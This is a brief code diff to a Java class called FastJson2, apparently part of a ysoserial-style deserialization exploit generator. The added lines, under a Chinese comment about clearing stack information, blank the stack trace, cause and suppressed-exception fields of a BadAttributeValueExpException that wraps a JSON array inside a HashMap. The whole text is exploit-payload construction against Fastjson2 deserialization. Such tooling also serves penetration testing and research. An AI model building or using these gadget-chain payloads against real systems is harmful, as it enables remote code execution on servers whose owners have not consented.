@@ -28,6 +28,10 @@ public class FastJson2 implements ObjectPayload<Object> {
 
         BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
         Reflections.setFieldValue(badAttributeValueExpException, "val", jsonArray);
+        //清除堆栈信息
+        Reflections.setFieldValue(badAttributeValueExpException,"stackTrace",new StackTraceElement[0]);
+        Reflections.setFieldValue(badAttributeValueExpException,"cause",null);
+        Reflections.setFieldValue(badAttributeValueExpException,"suppressedExceptions",null);
 
         HashMap hashMap = new HashMap();
         hashMap.put(object, badAttributeValueExpException);
